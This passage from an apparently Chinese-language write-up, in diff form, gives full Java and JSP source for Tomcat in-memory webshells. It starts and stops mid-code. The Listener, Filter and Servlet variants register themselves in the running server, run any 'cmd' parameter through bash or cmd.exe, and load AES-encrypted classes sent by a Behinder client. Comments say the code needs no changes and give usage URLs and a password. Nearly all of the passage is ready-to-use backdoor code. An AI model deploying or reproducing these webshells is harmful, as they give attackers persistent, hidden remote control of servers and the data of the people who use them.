+                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            }
+            filterChain.doFilter(servletRequest, servletResponse);
+        }
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    //下面是冰蝎马子的代码逻辑
+    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
+        //bytecode其实就是冰蝎马中自定义的ClassLoader的class内容，不过被base64编码过后的
+        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
+        try {
+            //获取到ClassLoader.defineClass()方法
+            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            define.setAccessible(true);
+            Class uclass = null;
+            //下面的try，总之就是要获取到类U的Class对象
+            try {
+                //通过ClassLoader.loadClass()方法获取到类U的Class对象
+                uclass = cl.loadClass("U");
+            } catch (ClassNotFoundException e) {
+                //如果没有找到类U的Class对象，就用ClassLoader.defineClass()方法获取
+                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
+            }
+            //从类U的Class对象中获取构造方法
+            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
+            constructor.setAccessible(true);
+            //获取到当前类的对象
+            Object u = constructor.newInstance(this.getClass().getClassLoader());
+            //获取类U的方法g()
+            Method Um = uclass.getDeclaredMethod("g", byte[].class);
+            Um.setAccessible(true);
+            String k = passwd;
+            //将密码写入session中
+            session.setAttribute("u", k);
+            Cipher c = Cipher.getInstance("AES");
+            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+            //从请求体中获取到base64数据，然后先base64解码，最后aes加密，获取到原始的class数据
+            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+            //通过类U的方法g()，将原始的class数据转化为Class对象eclass
+            Class eclass = (Class) Um.invoke(u, eClassBytes);
+            //实例化客户端传来的class文件，得到一个Object对象a
+            Object a = eclass.newInstance();
+            //从对象eclass中获取到方法equals
+            Method b = eclass.getDeclaredMethod("equals", Object.class);
+            b.setAccessible(true);
+            //调用equals对象
+            b.invoke(a, pageContext);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+    
+
+    @Override
+    public void destroy() {
+
+    }
+}
+
+```
+
+效果：
+
+![](https://s3.hedgedoc.org/demo/uploads/ab6978a7-e4bc-481f-a849-d79554f4b0fd.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/b506c559-4a2f-473d-b157-b0c9c4a89077.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/c14c29af-d3c4-451a-9e9c-448b29225168.png)
+
+over
+
+# 3、完整代码
+## 3.1、java源码
+### 3.1.1、Listener
+```
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.connector.RequestFacade;
+import org.apache.catalina.connector.Response;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpSession;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * 不用改了
+ * 标准的cmd内存马&冰蝎马
+ * 用法:
+ *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
+ *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
+ *
+ * 2023/08/03
+ */
+public class TLbx extends ClassLoader implements ServletRequestListener{
+
+    String passwd = "73f50c9f17291ce9";
+
+    static {
+        try {
+            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+            TLbx myListener = new TLbx();
+
+            standardContext.addApplicationEventListener(myListener);
+
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+        try {
+            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
+            Field getRequestField = requestFacade.getClass().getDeclaredField("request");
+            getRequestField.setAccessible(true);
+            Request request = (Request) getRequestField.get(requestFacade);
+            Response response = request.getResponse();
+            HttpSession  session = request.getSession();
+            Map<String, Object> pageContext = new HashMap<String, Object>();
+            pageContext.put("session", session);
+            pageContext.put("request", request);
+            pageContext.put("response", response);
+
+            String command = request.getParameter("cmd");
+            if (command != null){
+                String system = System.getProperty("os.name");
+                if (system.toLowerCase().contains("win")) {
+                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
+                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder stringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) {
+                        stringBuilder.append(line + '\n');
+                    }
+
+                    response.getOutputStream().write(stringBuilder.toString().getBytes());
+                    response.getOutputStream().flush();
+                    response.getOutputStream().close();
+                } else {
+                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
+                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder stringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) {
+                        stringBuilder.append(line + '\n');
+                    }
+
+                    response.getOutputStream().write(stringBuilder.toString().getBytes());
+                    response.getOutputStream().flush();
+                    response.getOutputStream().close();
+                }
+            }
+            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
+
+            if (request.getMethod().equals("POST")) {
+                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    //从java.lang.ClassLoader中获取到Class对象
+                    Class Lclass = cl.getClass().getSuperclass();
+                    //调用RushThere()方法，注入内存马
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
+        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
+        try {
+
+            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            define.setAccessible(true);
+            Class uclass = null;
+            try {
+                uclass = cl.loadClass("U");
+            } catch (ClassNotFoundException e) {
+                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
+            }
+            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
+            constructor.setAccessible(true);
+            Object u = constructor.newInstance(this.getClass().getClassLoader());
+            Method Um = uclass.getDeclaredMethod("g", byte[].class);
+            Um.setAccessible(true);
+            String k = passwd;
+            session.setAttribute("u", k);
+            Cipher c = Cipher.getInstance("AES");
+            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+            Class eclass = (Class) Um.invoke(u, eClassBytes);
+            Object a = eclass.newInstance();
+            Method b = eclass.getDeclaredMethod("equals", Object.class);
+            b.setAccessible(true);
+            b.invoke(a, pageContext);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
+
+    }
+
+
+}
+
+```
+### 3.1.2、Filter
+```
+import org.apache.catalina.Context;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * 不用改了
+ * 标准的cmd内存马&冰蝎马
+ * 用法:
+ *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
+ *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
+ *
+ * 2023/08/03
+ */
+public class TFbx extends ClassLoader implements Filter{
+
+    String passwd = "73f50c9f17291ce9";
+
+    static {
+        try {
+            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            Filter myFilter = new TFbx();
+            String filterName = "lan";
+
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilterName(filterName);
+            filterDef.setFilterClass(myFilter.getClass().getName());
+            filterDef.setFilter(myFilter);
+            filterDef.setAsyncSupported("true");
+            standardContext.addFilterDef(filterDef);
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.addURLPattern("/");
+            filterMap.setFilterName(filterName);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+            standardContext.addFilterMap(filterMap);
+
+            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+            constructor.setAccessible(true);
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+
+            Field filterConfigsField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
+            filterConfigsField.setAccessible(true);
+            HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
+
+            filterConfigs.put(filterName,filterConfig);
+
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        String command = servletRequest.getParameter("cmd");
+        if (command != null){
+            String system = System.getProperty("os.name");
+            if (system.toLowerCase().contains("win")) {
+                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder stringBuilder = new StringBuilder();
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line + '\n');
+                }
+
+                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+            } else {
+                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder stringBuilder = new StringBuilder();
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line + '\n');
+                }
+
+                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+            }
+        }
+
+        HttpServletRequest request = (HttpServletRequest) servletRequest;
+        HttpServletResponse response = (HttpServletResponse) servletResponse;
+        HttpSession session = request.getSession();
+
+        Map<String, Object> pageContext = new HashMap<String, Object>();
+        pageContext.put("session", session);
+        pageContext.put("request", request);
+        pageContext.put("response", response);
+
+        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
+
+        if (request.getMethod().equals("POST")) {
+            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                //从java.lang.ClassLoader中获取到Class对象
+                Class Lclass = cl.getClass().getSuperclass();
+                //调用RushThere()方法，注入内存马
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            }
+            filterChain.doFilter(servletRequest, servletResponse);
+        }
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
+        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
+        try {
+
+            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            define.setAccessible(true);
+            Class uclass = null;
+            try {
+                uclass = cl.loadClass("U");
+            } catch (ClassNotFoundException e) {
+                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
+            }
+            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
+            constructor.setAccessible(true);
+            Object u = constructor.newInstance(this.getClass().getClassLoader());
+            Method Um = uclass.getDeclaredMethod("g", byte[].class);
+            Um.setAccessible(true);
+            String k = passwd;
+            session.setAttribute("u", k);
+            Cipher c = Cipher.getInstance("AES");
+            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+            Class eclass = (Class) Um.invoke(u, eClassBytes);
+            Object a = eclass.newInstance();
+            Method b = eclass.getDeclaredMethod("equals", Object.class);
+            b.setAccessible(true);
+            b.invoke(a, pageContext);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+
+
+
+    @Override
+    public void destroy() {
+
+    }
+}
+
+```
+### 3.1.3、Servlet
+```
+import org.apache.catalina.Wrapper;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * 不用改了
+ * 标准的cmd内存马&冰蝎马
+ * 用法:
+ *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
+ *  2、冰蝎连接：http://xxx.xxx.xxx.x/lan 密码：lan
+ *
+ * 2023/08/03
+ */
+
+public class TSbx implements Servlet {
+    String passwd = "73f50c9f17291ce9";
+    static {
+        try {
+            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            TSbx myServlet = new TSbx();
+
+            String name = myServlet.getClass().getSimpleName();
+
+            Wrapper wrapper = standardContext.createWrapper();
+            wrapper.setName(name);
+            wrapper.setServlet(myServlet);
+
+            standardContext.addChild(wrapper);
+            standardContext.addServletMappingDecoded("/lan",name);
+
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void init(ServletConfig servletConfig) throws ServletException {
+
+    }
+
+    @Override
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+
+    @Override
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+        String command = servletRequest.getParameter("cmd");
+        if (command != null){
+            String system = System.getProperty("os.name");
+            if (system.toLowerCase().contains("win")) {
+                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder stringBuilder = new StringBuilder();
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line + '\n');
+                }
+
+                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+            } else {
+                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder stringBuilder = new StringBuilder();
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line + '\n');
+                }
+
+                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+            }
+        }
+
+        HttpServletRequest request = (HttpServletRequest) servletRequest;
+        HttpServletResponse response = (HttpServletResponse) servletResponse;
+        HttpSession session = request.getSession();
+
+        Map<String, Object> pageContext = new HashMap<String, Object>();
+        pageContext.put("session", session);
+        pageContext.put("request", request);
+        pageContext.put("response", response);
+
+        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
+
+        if (request.getMethod().equals("POST")) {
+            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                //从java.lang.ClassLoader中获取到Class对象
+                Class Lclass = cl.getClass().getSuperclass();
+                //调用RushThere()方法，注入内存马
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else {
+                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                RushThere(Lclass, cl, session, request, pageContext);
+            }
+        }
+    }
+
+    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
+        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
+        try {
+
+            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            define.setAccessible(true);
+            Class uclass = null;
+            try {
+                uclass = cl.loadClass("U");
+            } catch (ClassNotFoundException e) {
+                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
+            }
+            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
+            constructor.setAccessible(true);
+            Object u = constructor.newInstance(this.getClass().getClassLoader());
+            Method Um = uclass.getDeclaredMethod("g", byte[].class);
+            Um.setAccessible(true);
+            String k = passwd;
+            session.setAttribute("u", k);
+            Cipher c = Cipher.getInstance("AES");
+            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+            Class eclass = (Class) Um.invoke(u, eClassBytes);
+            Object a = eclass.newInstance();
+            Method b = eclass.getDeclaredMethod("equals", Object.class);
+            b.setAccessible(true);
+            b.invoke(a, pageContext);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public String getServletInfo() {
+        return null;
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+}
+
+
+```
+## 3.2、jsp源码
+### 3.2.1、Listener
+```
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.io.BufferedReader" %>
+<%@ page import="java.io.InputStreamReader" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.util.Map" %>
+<%@ page import="java.util.HashMap" %>
+<%@ page import="java.lang.reflect.Method" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="javax.crypto.Cipher" %>
+<%@ page import="javax.crypto.spec.SecretKeySpec" %>
+<%@page language="java" contentType="text/html; charset=UTF-8" %>
+
+<%--
+/**
+ * 不用改了
+ * 标准的cmd内存马&冰蝎马
+ * 用法:
+ *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
+ *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
+ *
+ * 2023/08/03
+ */
+--%>
+<%
+    class LanListener implements ServletRequestListener {
+
+        String passwd = "73f50c9f17291ce9";
+
+        @Override
+        public void requestInitialized(ServletRequestEvent sre) {
+            try {
+                RequestFacade requestFacade = (RequestFacade) sre.getServletRequest();
+                Field getRequestField = requestFacade.getClass().getDeclaredField("request");
+                getRequestField.setAccessible(true);
+                Request request = (Request) getRequestField.get(requestFacade);
+                Response response = request.getResponse();
+                HttpSession  session = request.getSession();
+                Map<String, Object> pageContext = new HashMap<String, Object>();
+                pageContext.put("session", session);
+                pageContext.put("request", request);
+                pageContext.put("response", response);
+
+                String command = request.getParameter("cmd");
+                if (command != null){
+                    String system = System.getProperty("os.name");
+                    if (system.toLowerCase().contains("win")) {
+                        Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
+                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                        StringBuilder stringBuilder = new StringBuilder();
+                        String line;
+                        while ((line = bufferedReader.readLine()) != null) {
+                            stringBuilder.append(line + '\n');
+                        }
+
+                        response.getOutputStream().write(stringBuilder.toString().getBytes());
+                        response.getOutputStream().flush();
+                        response.getOutputStream().close();
+                    } else {
+                        Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
+                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                        StringBuilder stringBuilder = new StringBuilder();
+                        String line;
+                        while ((line = bufferedReader.readLine()) != null) {
+                            stringBuilder.append(line + '\n');
+                        }
+
+                        response.getOutputStream().write(stringBuilder.toString().getBytes());
+                        response.getOutputStream().flush();
